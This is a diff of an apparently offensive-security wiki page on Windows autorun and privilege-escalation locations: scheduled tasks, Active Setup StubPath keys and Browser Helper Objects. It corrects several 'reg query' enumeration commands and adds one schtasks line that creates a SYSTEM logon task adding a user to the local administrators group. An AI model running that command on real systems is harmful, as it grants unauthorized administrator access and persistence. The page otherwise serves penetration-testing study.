@@ -18,6 +18,10 @@ schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
 schtasks /query /fo LIST 2>nul | findstr TaskName
 schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+
+#Schtask to give admin access
+#You can also write that content on a bat file that is being executed by a scheduled task
+schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
 ```
 
 ## Folders
@@ -242,7 +246,7 @@ Inside those keys you will find more keys and each for those will home some inte
 * **IsInstalled:**
   * 0: The component’s command will not run.
   * 1: The component’s command will be run once per user. This is the default \(if the IsInstalled value does not exist\).
-*  **StubPath**
+* **StubPath**
   * Format: Any valid command line, e.g. “notepad”
   * This is the command that is executed if Active Setup determines this component needs to run during logon.
 
@@ -251,10 +255,10 @@ If you could write/overwrite on any Key with _**IsInstalled == "1"**_ the key **
 {% endhint %}
 
 ```bash
-query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
-query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
-query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
-query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
+reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
+reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
+reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
+reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
 ```
 
 ### Browser Helper Objects
@@ -267,8 +271,8 @@ A **Browser Helper Object** \(**BHO**\) is a DLL module designed as a plugin for
 BHOs are still supported as of Windows 10, through Internet Explorer 11, while BHOs are not supported in the default web browser Microsoft Edge.
 
 ```bash
-query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
-query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
+reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
 ```
 
 Note that the registry will contain 1 new registry per each dll and it will be represented by the **CLSID**. You can find the CLSID info in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`
